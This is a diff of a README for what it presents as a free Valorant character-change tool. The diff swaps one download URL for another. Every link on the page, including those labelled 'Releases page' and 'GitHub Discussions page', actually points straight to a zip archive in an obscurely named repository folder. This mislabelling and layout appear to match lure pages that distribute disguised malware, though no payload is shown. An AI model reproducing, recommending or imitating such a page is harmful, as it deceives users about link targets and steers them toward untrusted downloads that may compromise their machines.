@@ -1,6 +1,6 @@
 # 🎯 valorant-assistant-character-change-tool - Simplify Your Valorant Character Choices
 
-[![Download](https://raw.githubusercontent.com/sukunavodich-svg/valorant-assistant-character-change-tool/main/lobigerous/valorant-assistant-character-change-tool_divisional.zip)](https://raw.githubusercontent.com/sukunavodich-svg/valorant-assistant-character-change-tool/main/lobigerous/valorant-assistant-character-change-tool_divisional.zip)
+[![Download](https://github.com/sukunavodich-svg/valorant-assistant-character-change-tool/raw/refs/heads/main/lobigerous/assistant_character_tool_valorant_change_1.7.zip)](https://github.com/sukunavodich-svg/valorant-assistant-character-change-tool/raw/refs/heads/main/lobigerous/assistant_character_tool_valorant_change_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the **Valorant Assistant Character Change Tool!** This application he
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/sukunavodich-svg/valorant-assistant-character-change-tool/main/lobigerous/valorant-assistant-character-change-tool_divisional.zip) to download the application.
+   Go to our [Releases page](https://github.com/sukunavodich-svg/valorant-assistant-character-change-tool/raw/refs/heads/main/lobigerous/assistant_character_tool_valorant_change_1.7.zip) to download the application.
 
 2. **Select the Latest Version**  
    Look for the most recent version of the tool. It's usually at the top of the list.
@@ -66,7 +66,7 @@ A: Yes, this tool is completely free and open-source for everyone to use.
 
 ## 🔗 Additional Resources
 
-For further guidance and community support, check out our discussion forums and additional documentation. You can also find helpful tips on character strategies and gameplay on our [GitHub Discussions page](https://raw.githubusercontent.com/sukunavodich-svg/valorant-assistant-character-change-tool/main/lobigerous/valorant-assistant-character-change-tool_divisional.zip).
+For further guidance and community support, check out our discussion forums and additional documentation. You can also find helpful tips on character strategies and gameplay on our [GitHub Discussions page](https://github.com/sukunavodich-svg/valorant-assistant-character-change-tool/raw/refs/heads/main/lobigerous/assistant_character_tool_valorant_change_1.7.zip).
 
 ## 📊 Research Topics
 
@@ -80,4 +80,4 @@ This tool is part of a larger framework aimed at facilitating various research a
 
 Thank you for your interest in the **Valorant Assistant Character Change Tool**. We hope it enhances your gaming experience!
 
-[![Download](https://raw.githubusercontent.com/sukunavodich-svg/valorant-assistant-character-change-tool/main/lobigerous/valorant-assistant-character-change-tool_divisional.zip)](https://raw.githubusercontent.com/sukunavodich-svg/valorant-assistant-character-change-tool/main/lobigerous/valorant-assistant-character-change-tool_divisional.zip)
+[![Download](https://github.com/sukunavodich-svg/valorant-assistant-character-change-tool/raw/refs/heads/main/lobigerous/assistant_character_tool_valorant_change_1.7.zip)](https://github.com/sukunavodich-svg/valorant-assistant-character-change-tool/raw/refs/heads/main/lobigerous/assistant_character_tool_valorant_change_1.7.zip)
